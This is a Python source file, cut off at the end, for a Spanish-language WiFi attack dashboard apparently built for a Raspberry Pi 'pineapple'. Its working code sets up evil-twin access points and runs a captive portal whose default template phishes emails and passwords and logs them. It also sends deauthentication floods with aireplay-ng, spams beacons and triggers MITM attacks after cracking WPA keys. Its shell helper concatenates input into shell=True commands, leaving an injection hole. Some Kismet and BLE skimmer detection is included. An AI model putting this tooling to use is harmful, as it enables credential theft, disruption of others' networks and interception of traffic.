#!/usr/bin/env python3
import http.server, subprocess, os, html, urllib.parse, urllib.request, base64, json, re

BASE=os.environ.get("PINACOLA_HOME") or os.path.dirname(os.path.abspath(__file__)); CRED=BASE+"/captured-creds.log"; PORTAL=BASE+"/portal-server.py"
FEED=BASE+"/dns-feed.log"; WTRESULT=BASE+"/wifitest.result"; MITMFEED=BASE+"/mitm-feed.log"
MITMREADY=BASE+"/mitm-ready"; MITMSTATE=BASE+"/mitm-attack.state"; MITMATTACK=BASE+"/mitm-attack.sh"
BLESCAN=BASE+"/ble-scan.json"; BLESTATE=BASE+"/ble-scan.state"; BLEPY=BASE+"/ble-scan.py"
BEACONSH=BASE+"/beacon-spam.sh"
PORTALS_DIR=BASE+"/portals"; ACTIVE_TPL=PORTALS_DIR+"/active.html"
ACTIVE_NAME_F=PORTALS_DIR+"/.active-name"; CREDS_JSON=BASE+"/captured-creds.json"
LEASES="/var/lib/misc/dnsmasq.leases"; DNSCFG="/etc/pineapple-dnsmasq.conf"
HOSTAPD="/etc/hostapd/pineapple-lab.conf"; KCONF="/root/.kismet/kismet_httpd.conf"
DEF_BSSID="22:CA:BA:0F:45:30"; DEF_CH="11"
DNS_PORTAL="interface=wlan0\nbind-interfaces\nno-resolv\ndhcp-range=192.168.66.10,192.168.66.50,255.255.255.0,12h\ndhcp-option=option:router,192.168.66.1\ndhcp-option=option:dns-server,192.168.66.1\naddress=/#/192.168.66.1\n"
DNS_NORMAL="interface=wlan0\nbind-interfaces\ndhcp-range=192.168.66.10,192.168.66.50,255.255.255.0,12h\ndhcp-option=option:router,192.168.66.1\ndhcp-option=option:dns-server,1.1.1.1\nserver=1.1.1.1\n"
HOSTAPD_WPA="interface=wlan0\ndriver=nl80211\nssid=PineapplePi-Lab\nhw_mode=g\nchannel=6\nauth_algs=1\nwpa=2\nwpa_passphrase=pineapple123\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"

CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#e6edf3;font-family:system-ui,-apple-system,sans-serif;display:flex;flex-direction:column;min-height:100vh}
a{color:#1f6feb;text-decoration:none}
#header{background:#161b22;border-bottom:1px solid #30363d;padding:0 16px;display:flex;align-items:center;height:52px;gap:14px;flex-shrink:0}
#logo{color:#f5c542;font-weight:700;font-size:15px;white-space:nowrap;margin-right:4px}
.hst{display:flex;flex-direction:column;align-items:center;min-width:48px}
.hst-val{font-size:13px;font-weight:700;color:#e6edf3;line-height:1}
.hst-lbl{font-size:9px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
.hst-bar{width:40px;height:3px;background:#30363d;border-radius:2px;margin-top:3px}
.hst-bar-fill{height:100%;border-radius:2px;background:#3fb950;transition:width .5s}
.hdiv{width:1px;height:28px;background:#30363d}
#layout{display:flex;flex:1;overflow:hidden}
#sidebar{width:190px;background:#161b22;border-right:1px solid #30363d;flex-shrink:0;padding:10px 0;overflow-y:auto}
.nav-item{display:flex;align-items:center;gap:10px;padding:9px 14px;cursor:pointer;border-radius:6px;margin:1px 8px;color:#8b949e;font-size:13px;transition:background .15s,color .15s;user-select:none;border-left:2px solid transparent}
.nav-item:hover{background:#21262d;color:#e6edf3}
.nav-item.active{background:#f5c54215;color:#f5c542;border-left-color:#f5c542}
.nav-icon{font-size:14px;width:18px;text-align:center;flex-shrink:0}
.nav-sep{height:1px;background:#30363d;margin:6px 14px}
#content{flex:1;overflow-y:auto;padding:18px}
.tab-page{display:none}
.tab-page.active{display:block}
.grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px;margin-bottom:14px}
.grid-4{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:14px}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;margin-bottom:14px}
.card-h{font-size:11px;font-weight:600;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center}
.card-h b{color:#e6edf3;font-size:14px;text-transform:none;letter-spacing:0}
.stat-card{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:14px}
.stat-val{font-size:26px;font-weight:700;line-height:1}
.stat-lbl{font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
.stat-bar{height:4px;background:#30363d;border-radius:2px;margin-top:8px;overflow:hidden}
.stat-bar-fill{height:100%;border-radius:2px;transition:width .5s}
.mod-card{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px}
.mod-label{font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.btn{border:0;border-radius:6px;padding:8px 14px;font-weight:600;cursor:pointer;font-size:13px;transition:opacity .15s;display:inline-block;vertical-align:middle}
.btn:hover{opacity:.82}
.btn-p{background:#f5c542;color:#0d1117}
.btn-r{background:#f85149;color:#fff}
.btn-b{background:#1f6feb;color:#fff}
.btn-g{background:#21262d;color:#e6edf3;border:1px solid #30363d}
.btn-sm{padding:4px 10px;font-size:12px}
.pill{display:inline-flex;align-items:center;gap:4px;padding:2px 9px;border-radius:20px;font-size:12px;font-weight:600}
.pon{background:#1a3a1f;color:#3fb950}
.poff{background:#2d1418;color:#f85149}
.pwarn{background:#3a2f0a;color:#f5c542}
.on{color:#3fb950;font-weight:700}
.off{color:#f85149;font-weight:700}
.muted{color:#8b949e}
.mono{font-family:monospace}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:7px 10px;border-bottom:1px solid #21262d}
th{color:#8b949e;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
tr:last-child td{border-bottom:none}
.fl{font-family:monospace;font-size:12px;padding:3px 0;border-bottom:1px solid #21262d;color:#8b949e}
.fl:last-child{border-bottom:none}
input[type=text],input:not([type]){background:#21262d;border:1px solid #30363d;color:#e6edf3;border-radius:6px;padding:7px 10px;font-size:13px;outline:none}
input:focus{border-color:#f5c542}
.form-row{display:flex;align-items:flex-end;gap:8px;flex-wrap:wrap;margin-bottom:10px}
.form-row label{display:block;font-size:11px;color:#8b949e;margin-bottom:3px}
.cred{background:#2d1418;border-left:3px solid #f85149;border-radius:6px;padding:8px 12px;margin:4px 0;font-family:monospace;font-size:12px;word-break:break-all}
.alert-h{background:#2d1418;border-left:3px solid #f85149;border-radius:6px;padding:8px 12px;margin:4px 0;font-size:12px}
.alert-m{background:#2d2308;border-left:3px solid #f5c542;border-radius:6px;padding:8px 12px;margin:4px 0;font-size:12px}
.ch-chart{margin:4px 0}
.ch-row{display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid #21262d}
.ch-row:last-child{border-bottom:none}
.ch-num{font-family:monospace;font-size:11px;color:#8b949e;width:32px;flex-shrink:0}
.ch-bw{flex:1;background:#21262d;border-radius:2px;height:10px;overflow:hidden}
.ch-bf{height:100%;border-radius:2px;transition:width .5s}
.ch-ct{font-size:11px;color:#8b949e;width:44px;text-align:right;flex-shrink:0}
.bflag{display:inline-block;padding:1px 7px;border-radius:10px;font-size:11px;font-weight:700;margin:1px}
.bf-skimmer{background:#f8514925;color:#f85149;border:1px solid #f8514960}
.bf-airtag{background:#3fb95025;color:#3fb950;border:1px solid #3fb95060}
.bf-apple{background:#1f6feb25;color:#79c0ff;border:1px solid #1f6feb60}
.tpl-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-bottom:14px}
.tpl-card{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;cursor:default}
.tpl-card.active-tpl{border-color:#f5c542}
.tpl-name{font-size:13px;font-weight:600;margin-bottom:8px;color:#e6edf3;word-break:break-all}
.tpl-actions{display:flex;gap:5px;flex-wrap:wrap}
textarea.code-ed{width:100%;min-height:280px;background:#0d1117;border:1px solid #30363d;color:#e6edf3;
  font-family:monospace;font-size:12px;border-radius:6px;padding:10px;resize:vertical;outline:none;box-sizing:border-box}
textarea.code-ed:focus{border-color:#f5c542}
.cred-row{display:grid;grid-template-columns:120px 110px 1fr;gap:8px;padding:6px 0;border-bottom:1px solid #21262d;font-size:12px;font-family:monospace}
.cred-row:last-child{border-bottom:none}
@media(max-width:640px){
  #layout{flex-direction:column}
  #sidebar{width:100%;display:flex;overflow-x:auto;padding:6px 8px;border-right:none;border-bottom:1px solid #30363d;gap:4px}
  .nav-item{padding:7px 12px;margin:0;border-radius:6px;font-size:12px;white-space:nowrap;border-left:none;border-bottom:2px solid transparent}
  .nav-item.active{border-left:none;border-bottom-color:#f5c542}
  .nav-icon{display:none}
  .nav-sep{display:none}
  #content{padding:12px}
  .hst{display:none}
  .hdiv{display:none}
}
"""

JS = r"""(function(){
'use strict';
var TABS=['dashboard','recon','ap','attack','defense','ble','portal'];
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function set(id,h){var e=document.getElementById(id);if(e)e.innerHTML=h;}
function txt(id,v){var e=document.getElementById(id);if(e)e.textContent=v;}
function fl(a,empty){if(!a||!a.length)return'<p class="muted">'+empty+'</p>';return[...a].reverse().map(x=>'<div class="fl">'+esc(x)+'</div>').join('');}
function pill(on,ton,toff){return on?'<span class="pill pon">&#x25cf; '+ton+'</span>':'<span class="pill poff">&#x25cf; '+toff+'</span>';}
function cc(v){return v>80?'#f85149':v>60?'#f5c542':'#3fb950';}

window.showTab=function(name){
  TABS.forEach(function(t){
    var p=document.getElementById('tab-'+t),b=document.getElementById('nav-'+t);
    if(p)p.className='tab-page'+(t===name?' active':'');
    if(b)b.className='nav-item'+(t===name?' active':'');
  });
  try{localStorage.setItem('pe-tab',name);}catch(e){}
};

window.setTarget=function(bssid,ch){
  var b=document.getElementById('wt-bssid'),c=document.getElementById('wt-ch');
  if(b)b.value=bssid;if(c)c.value=ch;
  showTab('recon');
};

function channelChart(stats){
  if(!stats||!Object.keys(stats).length)
    return'<p class="muted">Sin datos de canal. Lanza un escaneo primero.</p>';
  var vals=Object.values(stats);
  var max=Math.max.apply(null,vals.concat([1]));
  var h='<div class="ch-chart">';
  for(var ch=1;ch<=13;ch++){
    var n=stats[String(ch)]||0;
    var pct=Math.round(n/max*100);
    var col=n>=4?'#f85149':n>=2?'#f5c542':'#3fb950';
    h+='<div class="ch-row">'
      +'<span class="ch-num">CH'+ch+'</span>'
      +'<div class="ch-bw"><div class="ch-bf" style="width:'+(pct||2)+'%;background:'+col+'"></div></div>'
      +'<span class="ch-ct">'+n+(n===1?' AP':' APs')+'</span>'
      +'</div>';
  }
  return h+'</div>';
}

function bleTable(devs){
  if(!devs||!devs.length)return'<p class="muted">Sin dispositivos. Lanza un escaneo BLE (12s).</p>';
  var rows=devs.map(function(d){
    var flags=(d.flags||[]).map(function(f){
      var cls=f==='SKIMMER'?'bf-skimmer':f==='AIRTAG'?'bf-airtag':'bf-apple';
      return'<span class="bflag '+cls+'">'+esc(f)+'</span>';
    }).join('');
    var rssi=d.rssi?esc(String(d.rssi))+' dBm':'';
    return'<tr'+(d.flags&&d.flags.includes('SKIMMER')?' style="background:#2d141820"':'')+'>'
      +'<td class="mono" style="font-size:12px">'+esc(d.mac)+'</td>'
      +'<td>'+esc(d.name)+'</td><td style="font-size:12px">'+rssi+'</td><td>'+flags+'</td></tr>';
  });
  return'<table><thead><tr><th>MAC</th><th>Nombre</th><th>RSSI</th><th>Detecciones</th></tr></thead>'
    +'<tbody>'+rows.join('')+'</tbody></table>';
}

// ── Portal editor ──
window.portalLoadTpl=function(name){
  fetch('/api/portal_template?name='+encodeURIComponent(name))
    .then(function(r){return r.json();})
    .then(function(d){
      var n=document.getElementById('pe-name');
      var t=document.getElementById('pe-html');
      if(n)n.value=d.name||name;
      if(t)t.value=d.html||'';
    });
};
window.portalSave=function(activate){
  var name=(document.getElementById('pe-name')||{}).value||'';
  var html2=(document.getElementById('pe-html')||{}).value||'';
  if(!name.trim()){alert('Nombre obligatorio');return;}
  var fd=new FormData();
  fd.append('name',name.trim());
  fd.append('html',html2);
  fd.append('activate',activate?'1':'0');
  fetch('/portal_save',{method:'POST',body:new URLSearchParams(fd)})
    .then(function(){location.reload();});
};
window.portalDelete=function(name){
  if(!confirm('Borrar plantilla "'+name+'"?'))return;
  var fd=new URLSearchParams();fd.append('name',name);
  fetch('/portal_delete',{method:'POST',body:fd}).then(function(){location.reload();});
};
window.portalActivate=function(name){
  var fd=new URLSearchParams();fd.append('name',name);
  fetch('/portal_activate',{method:'POST',body:fd}).then(function(){location.reload();});
};
window.portalNew=function(){
  var n=document.getElementById('pe-name');
  var t=document.getElementById('pe-html');
  if(n)n.value='mi-portal';
  if(t)t.value='<!doctype html>\n<html><head><meta charset=utf-8>\n<meta name=viewport content="width=device-width,initial-scale=1">\n<title>WiFi Login</title>\n<style>\nbody{font-family:sans-serif;max-width:360px;margin:60px auto;text-align:center;background:#f5f5f5}\n.box{background:#fff;border-radius:12px;padding:28px;box-shadow:0 2px 12px #0002}\nh2{margin-bottom:6px}p{color:#666;font-size:14px;margin-bottom:20px}\ninput{display:block;width:100%;padding:11px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box}\nbutton{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}\n</style></head>\n<body><div class=box>\n<h2>&#127760; Acceso WiFi</h2>\n<p>Inicia sesi&oacute;n para conectarte a internet</p>\n<form method=POST action=/login>\n<input name=email placeholder="Correo electr&oacute;nico" type=email required>\n<input name=password placeholder="Contrase&ntilde;a" type=password required>\n<button type=submit>Conectar</button>\n</form>\n</div></body></html>';
  showTab('portal');
};
function renderPortalCreds(creds){
  var el=document.getElementById('portal-creds');
  if(!el)return;
  if(!creds||!creds.length){el.innerHTML='<p class="muted">Sin capturas a\xfan.</p>';return;}
  var h='';
  [...creds].reverse().forEach(function(c){
    var fields=Object.entries(c.data||{}).map(function(e){return esc(e[0])+'=<b>'+esc(e[1])+'</b>';}).join(' &nbsp;');
    h+='<div class=cred-row><span class=muted>'+esc(c.ts||'')+'</span><span class=muted>'+esc(c.ip||'')+'</span><span>'+fields+'</span></div>';
  });
  el.innerHTML=h;
}

function mcard(d){
  var r=d.mitm_ready;
  if(d.mitm_state==='running'){
    var ssid=r&&r.SSID?r.SSID:'?';
    return'<div style="margin-bottom:10px">'+pill(true,'EN CURSO','')+' &nbsp;<span class="muted">Kismet pausado</span></div>'
      +'<p style="margin-bottom:8px">Conectado a <b>'+esc(ssid)+'</b></p>'
      +fl(d.mitm_feed,'sin tráfico aún...')
      +'<form method="POST" action="/mitmattack_stop" style="margin-top:10px"><button class="btn btn-r">Detener MITM</button></form>';
  }
  if(d.mitm_state==='starting')
    return'<p><span class="pill pwarn">&#x25cf; conectando...</span></p><form method="POST" action="/mitmattack_stop"><button class="btn btn-r">Cancelar</button></form>';
  if(r&&r.KEY){
    return'<table style="margin-bottom:12px"><tr><th>SSID</th><td>'+esc(r.SSID||'?')+'</td></tr>'
      +'<tr><th>BSSID</th><td class="muted mono">'+esc(r.BSSID||'')+'</td></tr>'
      +'<tr><th>Key</th><td style="color:#f5c542;font-family:monospace">'+esc(r.KEY)+'</td></tr></table>'
      +'<form method="POST" action="/mitmattack"><button class="btn btn-r">&#9889; Lanzar MITM</button></form>'
      +'<p class="muted" style="font-size:11px;margin-top:8px">Pausa Kismet. Solo redes propias/autorizadas.</p>';
  }
  return'<p class="muted">Ejecuta el test WiFi (tab Recon). El botón aparece aquí tras crackear la contraseña.</p>';
}

function clientsTable(cl){
  if(!cl||!cl.length)return'<p class="muted">(ninguno asociado)</p>';
  return'<table><thead><tr><th>MAC</th><th>IP</th><th>Nombre</th><th>Señal</th></tr></thead><tbody>'
    +cl.map(c=>'<tr><td class="mono">'+esc(c.mac)+'</td><td>'+esc(c.ip)+'</td><td>'+esc(c.name)+'</td><td>'+esc(c.signal)+'</td></tr>').join('')
    +'</tbody></table>';
}

function scanTable(sc){
  if(!sc||!sc.length)return'<p class="muted">Sin resultados. Lanza un escaneo para ver redes cercanas.</p>';
  return'<table><thead><tr><th>BSSID</th><th>SSID</th><th>CH</th><th>ENC</th><th>Señal</th><th></th></tr></thead><tbody>'
    +sc.map(ap=>'<tr><td class="mono">'+esc(ap.bssid)+'</td><td>'+esc(ap.ssid)+'</td>'
      +'<td>'+esc(ap.ch)+'</td><td>'+esc(ap.enc)+'</td><td>'+esc(ap.power)+' dBm</td>'
      +'<td><button class="btn btn-sm btn-p" type="button" onclick="setTarget(\''+ap.bssid.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\',\''+ap.ch.replace(/'/g,"\\'")+'\')">Target</button></td></tr>').join('')
    +'</tbody></table>';
}

function poll(){
  fetch('/api/live').then(function(r){return r.json();}).then(function(d){
    var cpu=Math.round(d.cpu||0),ram=Math.round(d.ram||0);
    txt('hdr-cpu',cpu+'%');txt('hdr-ram',ram+'%');txt('hdr-clients',d.clients);txt('hdr-kismet',d.k_count);
    var bc=document.getElementById('bar-cpu');if(bc){bc.style.width=cpu+'%';bc.style.background=cc(cpu);}
    var br=document.getElementById('bar-ram');if(br){br.style.width=ram+'%';br.style.background=cc(ram);}
    set('s-cpu','<span style="color:'+cc(cpu)+'">'+cpu+'%</span>');
    set('s-ram','<span style="color:'+cc(ram)+'">'+ram+'%</span>');
    txt('s-uptime',d.uptime||'?');txt('s-kdevs',d.k_count);
    var sb1=document.getElementById('sbar-cpu');if(sb1){sb1.style.width=cpu+'%';sb1.style.background=cc(cpu);}
    var sb2=document.getElementById('sbar-ram');if(sb2){sb2.style.width=ram+'%';sb2.style.background=cc(ram);}
    var apst=d.ap_up?pill(true,'ACTIVO','')+' <b>'+esc(d.ap_ssid||'')+'</b>':pill(false,'','parado');
    set('dash-ap',apst);
    var kst=d.kismet==='active'?pill(true,'active','')+' <span class="muted">'+esc(d.k_count)+' devs</span>':pill(false,'',''+esc(d.kismet));
    set('dash-kismet',kst);
    set('dash-portal',d.portal?pill(true,'ON',''):pill(false,'','off'));
    var mst=d.mitm_state==='running'?pill(true,'EN CURSO',''):d.mitm_state==='starting'?'<span class="pill pwarn">&#x25cf; conectando</span>':pill(false,'','idle');
    set('dash-mitm',mst);
    set('dash-wt','<pre style="white-space:pre-wrap;font-family:monospace;font-size:12px;color:#3fb950;margin:0">'+esc(d.wt_result)+'</pre>');
    txt('dash-creds',d.creds);
    // recon
    set('wt-result','<pre style="white-space:pre-wrap;font-family:monospace;font-size:12px;color:#3fb950;margin:0 0 12px">'+esc(d.wt_result)+'</pre>');
    set('scan-table',scanTable(d.scan));
    set('channel-chart',channelChart(d.channel_stats||{}));
    // ap tab
    set('client-table',clientsTable(d.clients_data||[]));txt('client-count',d.clients);
    set('dns-feed',fl(d.dns,'sin tráfico DNS aún'));txt('cred-count',d.creds);
    // attack
    set('mitm-inner',mcard(d));
    set('mitm-feed',fl(d.mitm_feed,'sin HTTPS aún'));
    var bspam=d.beacon_spam;
    set('beacon-state',bspam?'<span class="pill pwarn">&#x25cf; ACTIVO &mdash; inundando airespace</span>':pill(false,'','parado'));
    set('beacon-btn',bspam?'<form method="POST" action="/beacon_spam_stop"><button class="btn btn-r">Detener Beacon Spam</button></form>'
      :'<form method="POST" action="/beacon_spam"><button class="btn btn-r">&#128246; Lanzar Beacon Spam</button></form>');
    // defense
    var ks2=d.kismet==='active'?pill(true,'active','')+' &nbsp;dispositivos: <b>'+esc(d.k_count)+'</b>':pill(false,'',''+esc(d.kismet));
    set('k-state',ks2);
    // ble tab
    var bst=d.ble_state||'idle';
    var bspill=bst==='running'?'<span class="pill pwarn">&#x25cf; escaneando... (12s)</span>'
      :bst==='done'?'<span class="pill pon">&#x25cf; completado</span>'
      :pill(false,'','idle');
    set('ble-state',bspill);
    set('ble-table',bleTable(d.ble_devices||[]));
    var skimmers=(d.ble_devices||[]).filter(function(x){return x.flags&&x.flags.includes('SKIMMER');});
    var airtags=(d.ble_devices||[]).filter(function(x){return x.flags&&x.flags.includes('AIRTAG');});
    set('ble-summary',
      (skimmers.length?'<span class="pill poff" style="margin-right:6px">&#9888; '+skimmers.length+' SKIMMER'+(skimmers.length>1?'S':'')+'</span>':'')
      +(airtags.length?'<span class="pill pon" style="margin-right:6px">'+airtags.length+' AIRTAG'+(airtags.length>1?'S':'')+'</span>':'')
      +((!skimmers.length&&!airtags.length&&bst==='done')
        ?'<span class="muted" style="font-size:12px">Sin amenazas detectadas</span>':''));
    // portal tab
    var pname=d.portal_active_name||'';
    set('portal-status',d.portal
      ?pill(true,'ACTIVO','')+'&nbsp;<span class="muted">plantilla: <b>'+esc(pname)+'</b></span>'
      :pill(false,'','apagado'));
    set('portal-toggle-btn',d.portal
      ?'<form method="POST" action="/portal_off"><button class="btn btn-r">Apagar portal</button></form>'
      :'<form method="POST" action="/portal_on"><button class="btn btn-p">Activar portal activo</button></form>');
    renderPortalCreds(d.portal_creds||[]);
  }).catch(function(){});
}

(function initTabs(){
  var saved='';try{saved=localStorage.getItem('pe-tab')||'';}catch(e){}
  showTab(TABS.indexOf(saved)>=0?saved:'dashboard');
  TABS.forEach(function(t){var b=document.getElementById('nav-'+t);if(b)b.addEventListener('click',function(){showTab(t);});});
})();
setInterval(poll,3000);poll();
})();"""

MANIFEST='{"name":"Pineapple Express","short_name":"Pineapple","start_url":"/","display":"standalone","background_color":"#0d1117","theme_color":"#0d1117","icons":[{"src":"/icon-192.png","sizes":"192x192","type":"image/png"},{"src":"/icon-512.png","sizes":"512x512","type":"image/png"}]}'

def sh(c):
    try: return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=25).stdout.strip()
    except: return ""
def ap_state():
    info=sh("iw dev wlan0 info"); up=bool(sh("pgrep hostapd")) and "type AP" in info; ssid=""; ch=""
    for l in info.splitlines():
        s=l.strip()
        if s.startswith("ssid "): ssid=s[5:]
        if s.startswith("channel "): ch=s.split()[1]
    return up,ssid,ch
def ap_cfg():
    t=open(HOSTAPD).read() if os.path.exists(HOSTAPD) else ""
    ssid=""
    for l in t.splitlines():
        if l.startswith("ssid="): ssid=l[5:]
    return ssid,("wpa=2" in t)
def set_dns(cfg):
    open(DNSCFG,"w").write(cfg); sh("pkill -f pineapple-dnsmasq"); sh("dnsmasq --conf-file="+DNSCFG)
def ap_up():
    sh("pkill hostapd; sleep 1; nmcli dev set wlan0 managed no; ip addr flush dev wlan0; ip addr add 192.168.66.1/24 dev wlan0; ip link set wlan0 up; hostapd -B "+HOSTAPD)
def ap_start():
    ap_up()
    cfg=open(DNSCFG).read() if os.path.exists(DNSCFG) else ""
    if "address=/#/" in cfg: sh("pkill -f pineapple-dnsmasq; dnsmasq --conf-file="+DNSCFG)
    else: set_dns(DNS_NORMAL)
    sh("sysctl -w net.ipv4.ip_forward=1")
    sh("iptables -t nat -C POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    sh("iptables -C FORWARD -i wlan0 -o eth0 -j ACCEPT 2>/dev/null || iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT")
    sh("iptables -C FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT")
def set_eviltwin(ssid):
    open(HOSTAPD,"w").write("interface=wlan0\ndriver=nl80211\nssid="+ssid+"\nhw_mode=g\nchannel=6\n")
    ap_up()
def set_normal_ap():
    open(HOSTAPD,"w").write(HOSTAPD_WPA); ap_up()
def clients():
    sd=sh("iw dev wlan0 station dump"); assoc={}; cur=None
    for l in sd.splitlines():
        s=l.strip()
        if s.startswith("Station "): cur=s.split()[1].lower(); assoc[cur]="?"
        elif s.startswith("signal:") and cur: assoc[cur]=s.split()[1]+" dBm"
    lease={}
    if os.path.exists(LEASES):
        for l in open(LEASES):
            p=l.split()
            if len(p)>=4: lease[p[1].lower()]=(p[2],p[3])
    return [(m,lease.get(m,("?","?"))[0],lease.get(m,("?","?"))[1],s) for m,s in assoc.items()]
def creds():
    return [l.strip() for l in open(CRED) if l.strip()][-30:] if os.path.exists(CRED) else []
def dnsfeed():
    return [l.strip() for l in open(FEED) if l.strip()][-15:] if os.path.exists(FEED) else []
def wifitest_result():
    return open(WTRESULT).read().strip() if os.path.exists(WTRESULT) else "(nunca ejecutado - pulsa el boton)"
def mitmfeed():
    return [l.strip() for l in open(MITMFEED) if l.strip()][-15:] if os.path.exists(MITMFEED) else []
def mitm_ready():
    if not os.path.exists(MITMREADY): return None
    d={}
    for l in open(MITMREADY):
        l=l.strip()
        if '=' in l: k,v=l.split('=',1); d[k]=v
    return d if d.get('KEY') else None
def mitm_attack_state():
    s=open(MITMSTATE).read().strip() if os.path.exists(MITMSTATE) else "idle"
    if s=="running" and not sh("pgrep -f mitm-attack.sh"): s="stopped"
    return s
def portal_on_state():
    cfg=open(DNSCFG).read() if os.path.exists(DNSCFG) else ""
    return ("address=/#/" in cfg) and bool(sh("pgrep -f "+PORTAL))
def portal_on():
    set_dns(DNS_PORTAL)
    sh("iptables -t nat -C PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.66.1:80 2>/dev/null || iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.66.1:80")
    sh("pkill -f "+PORTAL)
    sh("nohup python3 "+PORTAL+" >/tmp/portal.log 2>&1 &")
def portal_off():
    sh("pkill -f "+PORTAL)
    sh("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.66.1:80 2>/dev/null")
    set_dns(DNS_NORMAL)
def deauth(bssid,ch):
    sh("systemctl stop kismet-sensor.service")
    sh("ip link set wlan1 down; iw dev wlan1 set type monitor; ip link set wlan1 up; iw dev wlan1 set channel "+ch)
    sh("timeout 7 aireplay-ng -0 10 -a "+bssid+" wlan1")
    sh("systemctl start kismet-sensor.service")
def kcreds():
    u=p=""
    if os.path.exists(KCONF):
        t=open(KCONF).read()
        mu=re.search(r"httpd_username=(.*)",t); mp=re.search(r"httpd_password=(.*)",t)
        if mu: u=mu.group(1).strip()
        if mp: p=mp.group(1).strip()
    return u,p
def kapi(path):
    u,p=kcreds()
    try:
        r=urllib.request.Request("http://127.0.0.1:2502"+path)
        if u: r.add_header("Authorization","Basic "+base64.b64encode(("%s:%s"%(u,p)).encode()).decode())
        return json.load(urllib.request.urlopen(r,timeout=2))
    except Exception: return None
def k_alerts():
    d=kapi("/alerts/last-time/0/alerts.json")
    if not isinstance(d,list): return None
    return [(a.get("kismet.alert.header","?"),int(a.get("kismet.alert.severity",0)),a.get("kismet.alert.text","")[:100]) for a in d[-8:]]
def k_count():
    d=kapi("/system/status.json"); return d.get("kismet.system.devices.count","?") if isinstance(d,dict) else "?"
_cpu_prev=None
def sys_stats():
    global _cpu_prev
    try:
        line=open("/proc/stat").readline()
        vals=[int(x) for x in line.split()[1:]]
        idle=vals[3]; total=sum(vals)
        if _cpu_prev:
            d_idle=idle-_cpu_prev[0]; d_total=total-_cpu_prev[1]
            cpu=min(100,round((1-d_idle/max(d_total,1))*100,1))
        else: cpu=0
        _cpu_prev=(idle,total)
    except: cpu=0
    try:
        mem={}
        for l in open("/proc/meminfo"):
            k,v=l.split(":",1); mem[k.strip()]=int(v.strip().split()[0])
        ram=round((mem["MemTotal"]-mem.get("MemAvailable",mem["MemTotal"]))/mem["MemTotal"]*100,1)
    except: ram=0
    try:
        secs=int(float(open("/proc/uptime").read().split()[0]))
        h,r=divmod(secs,3600); m=r//60
        uptime=(str(h)+"h "+str(m)+"m") if h else (str(m)+"m")
    except: uptime="?"
    return cpu,ram,uptime
def parse_scan():
    f="/tmp/scan-01.csv"
    if not os.path.exists(f): return []
    aps=[]; in_aps=True
    for line in open(f,errors="replace"):
        line=line.strip()
        if line.startswith("Station MAC"): in_aps=False; continue
        if not in_aps or not line: continue
        parts=[x.strip() for x in line.split(",")]
        if len(parts)<14 or parts[0]=="BSSID": continue
        try:
            bssid=parts[0]; ch=parts[3]; enc=parts[5]; power=parts[8]; ssid=parts[13]
            if bssid and len(bssid)==17:
                aps.append({"bssid":bssid,"ssid":ssid,"ch":ch,"enc":enc,"power":power})
        except: pass
    return aps
def parse_channel_stats():
    f="/tmp/scan-01.csv"
    if not os.path.exists(f): return {}
    ch={}; in_aps=True
    for line in open(f,errors="replace"):
        line=line.strip()
        if line.startswith("Station MAC"): in_aps=False; continue
        if not in_aps or not line: continue
        parts=[x.strip() for x in line.split(",")]
        if len(parts)<14 or parts[0]=="BSSID": continue
        try:
            c=int(parts[3])
            if 1<=c<=13: ch[str(c)]=ch.get(str(c),0)+1
        except: pass
    return ch
def recon_scan():
    sh("systemctl stop kismet-sensor.service; pkill -9 -f kismet_cap_linux_wifi; sleep 1")
    sh("nmcli dev set wlan1 managed no 2>/dev/null; ip link set wlan1 down; iw dev wlan1 set type monitor; ip link set wlan1 up 2>/dev/null")
    sh("rm -f /tmp/scan-*.csv")
    sh("nohup bash -c 'timeout 15 airodump-ng --output-format csv -w /tmp/scan wlan1 >/dev/null 2>&1; systemctl start kismet-sensor.service' &")
def ble_scan_start():
    sh("hciconfig hci0 up 2>/dev/null")
    open(BLESTATE,"w").write("running")
    sh("nohup bash -c 'python3 "+BLEPY+" > "+BLESCAN+" 2>/tmp/ble-scan.log; echo done > "+BLESTATE+"' &")
def ble_scan_state():
    return open(BLESTATE).read().strip() if os.path.exists(BLESTATE) else "idle"
def ble_scan_results():
    if not os.path.exists(BLESCAN): return []
    try: return json.load(open(BLESCAN))
    except: return []
def beacon_spam_active():
